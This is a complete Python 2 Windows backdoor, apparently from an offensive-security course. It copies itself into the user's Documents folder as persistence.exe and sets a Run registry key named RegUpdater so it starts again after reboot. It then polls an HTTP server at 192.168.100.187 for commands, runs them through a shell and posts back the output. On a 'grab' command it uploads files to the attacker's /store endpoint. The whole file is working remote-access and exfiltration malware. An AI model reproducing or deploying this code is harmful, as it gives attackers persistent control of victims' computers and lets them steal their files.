import os # need for getting working dir
import shutil # needed for file copying
import subprocess # needed for getting user profile
import _winreg as wreg # needed for editing registry

import requests # Download Link https://pypi.python.org/pypi/requests#downloads
import time


# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
destination = userprof.strip('\n\r') + '\\Documents\\' + 'persistence.exe'

# reconn phase 1 & 2

# verify if our script was run before and our backdoor was copied to our destination
if not os.path.exists(destination):

    # first time our backdoor gets executed
    # copy our backdoor to our destination - C:\Users\XY\Documents\
    shutil.copyfile(path + '\persistence.exe', destination)

    # create registry key called Regupdater pointing to our  new backdoor path (destination)
    # we use HKEY_CURRENT_USER path, so we do not need admin priv
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()



# last phase is to start a reverse connection back to our machine

while True: 

    req = requests.get('http://192.168.100.187') # send GET request to our HTTP sever
    command = req.text # store the received txt into command variable
        
    if 'terminate' in command:
        break # end loop

    # Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
    # notify our attacker that we are unable to find the file, but if the file is there then we will :-
    # 1.Append /store in the URL
    # 2.Add a dictionary key called 'file'
    # 3.requests library use POST method called "multipart/form-data" when submitting files

    #All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output
    #Please see the server script for more details on how we can use these points to get the file
    
    elif 'grab' in command:

        grab, path = command.split('*')
        if os.path.exists(path):
            url = 'http://192.168.100.187/store' # append /store in URL
            files = {'file': open(path, 'rb')} # add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # send the file and behind the scenes, requests lib use POST method called "multipart/form-data"

        else: # file does not exist
            post_response = requests.post(url='http://192.168.100.187', data='[-] Not able to find the file!')

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.100.187', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://192.168.100.187', data=CMD.stderr.read() )  # or the error -if any-

    time.sleep(3)
    
